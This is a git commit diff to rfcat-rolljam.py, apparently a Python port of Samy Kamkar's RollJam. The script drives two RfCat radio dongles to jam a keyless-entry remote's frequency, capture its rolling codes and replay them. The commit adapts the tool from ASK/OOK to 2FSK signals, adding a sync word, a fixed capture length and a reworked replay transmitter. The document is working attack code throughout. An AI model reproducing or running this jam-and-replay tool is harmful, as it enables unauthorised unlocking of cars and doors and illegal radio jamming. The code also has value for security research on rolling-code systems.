4c40fb1bcba0972caaafb4b2c3cd5d05ae6f1fc9
Djamil Elaidi <d.elaidi@comthings.com>
2017-11-15 18:55:23 +0100

    2FSK rolljam
    Signed-off-by: Djamil Elaidi <d.elaidi@comthings.com>

--- rfcat-rolljam.py
+++ rfcat-rolljam.py
@@ -31,14 +31,14 @@ import time
 import pickle
 
 parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), and Corey Harding.', version="1.0")
-parser.add_argument('-f', action="store", default="433875000", dest="baseFreq", help='Target frequency to listen for remote (default: 433875000)', type=int)
-parser.add_argument('-r', action="store", dest="baudRate", default=3200, help='Baudrate (default: 3200)', type=int)
+parser.add_argument('-f', action="store", default="433880000", dest="baseFreq", help='Target frequency to listen for remote (default: 433875000)', type=int)
+parser.add_argument('-r', action="store", dest="baudRate", default=2314, help='Baudrate (default: 3200)', type=int)
 parser.add_argument('-n', action="store", dest="numSignals", default=2, help='Number of signals to capture before replaying (default: 2)', type=int)
 parser.add_argument('-i', action="store", default="24000", dest="chanWidth", help='Width of each channel (lowest being 24000 -- default)', type=int)
 parser.add_argument('-c', action="store", default="54000", dest="chanBW", help='Channel BW for RX (default: 60000)', type=int)
 parser.add_argument('-I', action="store", default="", dest="inFile", help='File to read in')
 parser.add_argument('-O', action="store", default="", dest="outFile", help='Output file to save captures to')
-parser.add_argument('-o', action="store", default="-80000", dest="offset", help='Frequency offset of jammer (default: -70000)')
+parser.add_argument('-o', action="store", default="-100000", dest="offset", help='Frequency offset of jammer (default: -70000)')
 parser.add_argument('-p', action="store", default="200", dest="power", help='Power level for re-transmitting (default: 200)', type=int)
 parser.add_argument('-m', action="store", default="-40", dest="minRSSI", help='Minimum RSSI db to accept signal (default: -40)', type=int)
 parser.add_argument('-M', action="store", default="40", dest="maxRSSI", help='Maximum RSSI db to accept signal (default: 40)', type=int)
@@ -46,12 +46,16 @@ parser.add_argument('-k', action="store_true", dest="waitForKeypress", default=F
 results = parser.parse_args()
 
 jammingFreq = int(results.baseFreq) + int(results.offset)
+SYNCHRO_WORD = 0xaaaa
+SYNCHRO_WORD_BYTES = bitstring.BitArray(hex=hex(SYNCHRO_WORD)).tobytes()
+DEFAULT_CAPTURE_LENGTH = 64
 
 rawCapture = []
 print "Configuring Scanner on Frequency: " + str(results.baseFreq)
 d = RfCat(idx=0)
 #d.setModeIDLE()
-d.setMdmModulation(MOD_ASK_OOK)
+d.setMdmModulation(MOD_2FSK)
+d.setMdmDeviatn(10000)
 d.setFreq(results.baseFreq)
 d.setMdmDRate(results.baudRate)
 d.setMdmChanBW(results.chanBW)
@@ -61,12 +65,13 @@ d.setChannel(0)
 d.setAmpMode(RF_RX_POWER_AMPLIFIER_ACTION_ON_RX)
 d.poke(AGCCTRL2, "%c" % 0xf8)
 d.poke(AGCCTRL1, "%c" % 0x70)
-d.lowball(1)
+d.lowball(3, sync=SYNCHRO_WORD, length=DEFAULT_CAPTURE_LENGTH) # need in order to read data
 
 print "Configuring Jammer on Frequency: " + str(jammingFreq)
 c = RfCat(idx=1)
 #c.setModeIDLE()
-c.setMdmModulation(MOD_ASK_OOK)  # on of key
+c.setMdmModulation(MOD_2FSK)  # on of key
+c.setMdmDeviatn(10000)
 c.setFreq(jammingFreq)  # frequency
 c.setMdmDRate(results.baudRate)  # how long each bit is transmited for
 c.setMdmChanBW(results.chanBW)  # how wide channel is
@@ -74,7 +79,7 @@ c.setMdmChanSpc(results.chanWidth)
 c.setChannel(0)
 c.setMaxPower()  # max power
 c.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON_TX)
-c.lowball(1)  # need in order to read data
+c.lowball(1, length=DEFAULT_CAPTURE_LENGTH)
 
 time.sleep(1)  # warm up
 
@@ -112,7 +117,7 @@ if(results.inFile != ''):
 print "Jamming...."
 #c.setModeTX()  # start transmitting
 c.sendJammingStart(jammingFreq, jammingFreq, results.baudRate, MOD_ASK_OOK)
-raw_input("Press enter to start scanning")
+#raw_input("Press enter to start scanning")
 
 print "Scanning..."
 while True:
@@ -124,13 +129,13 @@ while True:
 
         #sampleString = re.sub(r'((f)\2{8,})', '',sampleString)
         #if (re.search(r'((0)\2{15,})', sampleString)):
-        if (re.search(r'((0){8,}[0-9a-f]{32,})', sampleString)):
-            print "Signal Strength:" + str(strength)
-            #if(strength > results.minRSSI and strength < results.maxRSSI):
-            rawCapture.append(sampleString)
-            #print "Found " + str(sampleString)
-            if(len(rawCapture) >= results.numSignals):
-                break
+        #if (re.search(r'((0){8,}[0-9a-f]{32,})', sampleString)):
+        print "Signal Strength:" + str(strength)
+        #if(strength > results.minRSSI and strength < results.maxRSSI):
+        rawCapture.append(sampleString)
+        #print "Found " + str(sampleString)
+        if(len(rawCapture) >= results.numSignals):
+            break
 
     except ChipconUsbTimeoutException:
         pass
@@ -157,20 +162,32 @@ if(results.waitForKeypress == True):
 #c.setModeIDLE()  # put dongle in idle mode to stop jamming
 c.sendJammingStop()
 
+print "Configuring Transmitter on Frequency: " + str(results.baseFreq)
+c.setModeIDLE()
+c.setMdmModulation(MOD_2FSK)  # on of key
+c.setMdmDeviatn(10000)
+c.setFreq(results.baseFreq)  # switch to remote control frequency
+c.setMdmDRate(results.baudRate)  # how long each bit is transmited for
+c.setMdmChanBW(results.chanBW)  # how wide channel is
+c.setMdmChanSpc(results.chanWidth)
+c.setChannel(0)
+c.setMaxPower()  # max power
+c.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON_TX)
+c.makePktFLEN(DEFAULT_CAPTURE_LENGTH)
+
+print 'Replaying'
+key_packed = SYNCHRO_WORD_BYTES + bitstring.BitArray(hex=rawCapture[0]).tobytes()
+print "Capture 1 of " + str(len(rawCapture)) + ": " + key_packed.encode('hex')
+
 if(results.waitForKeypress == True):
     raw_input("Press enter to send first capture")
 
-print 'Replaying'
-key_packed = bitstring.BitArray(hex=rawCapture[0]).tobytes()
-c.setModeIDLE()
-c.setFreq(results.baseFreq) # switch to remote control frequency
-c.makePktFLEN(len(key_packed))
 c.RFxmit(key_packed)
 print "Sent capture 1"
 
 try:
     for i in range(1, len(rawCapture)):
-        key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
+        key_packed = SYNCHRO_WORD_BYTES + bitstring.BitArray(hex=rawCapture[i]).tobytes()
         print "Capture " + str(i + 1) + " of " + str(len(rawCapture)) + ": " + key_packed.encode('hex')
         raw_input("Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
         c.setModeIDLE()
